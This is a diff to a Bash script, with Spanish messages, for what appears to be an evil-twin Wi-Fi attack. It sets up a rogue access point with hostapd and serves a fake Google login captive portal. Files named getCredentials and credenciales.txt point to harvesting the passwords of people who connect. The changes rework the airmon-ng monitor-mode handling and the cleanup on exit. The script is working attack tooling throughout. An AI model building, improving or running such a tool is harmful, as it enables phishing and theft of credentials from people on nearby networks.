@@ -18,6 +18,9 @@ function ctrl_c(){
 	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
 	rm dnsmasq.conf hostapd.conf 2>/dev/null
 	rm -r assets google-login.ep helper.php index.php jquery-2.2.1.min.js MyPortal.php post.php Roboto-Regular.ttf iface 2>/dev/null
+	ifconfig wlan0mon down
+	iwconfig wlan0mon mode monitor
+	ifconfig wlan0mon up; airmon-ng stop wlan0mon > /dev/null 2>&1
 	tput cnorm
 	exit
 }
@@ -85,10 +88,12 @@ function getCredentials(){
 function startAttack(){
 	clear; if [[ -e credenciales.txt ]]; then
 		rm -rf credenciales.txt
-	fi; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
+	fi
 
 	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1
 
+	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
+	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
 	counter=1
 	for interface in $(cat iface); do
 		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
@@ -112,10 +117,10 @@ function startAttack(){
 	echo -e "auth_algs=1\n" >> hostapd.conf
 	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
 
-	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando modo monitor en la interfaz $choosed_interface${endColour}\n"
-	ifconfig $choosed_interface down; sleep 2
-	iwconfig $choosed_interface mode monitor
-	ifconfig $choosed_interface up
+	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
+#	ifconfig $choosed_interface down; sleep 2
+#	iwconfig $choosed_interface mode monitor; sleep 4
+#	ifconfig $choosed_interface up
 	sleep 2
 	echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
 	hostapd hostapd.conf > /dev/null 2>&1 &
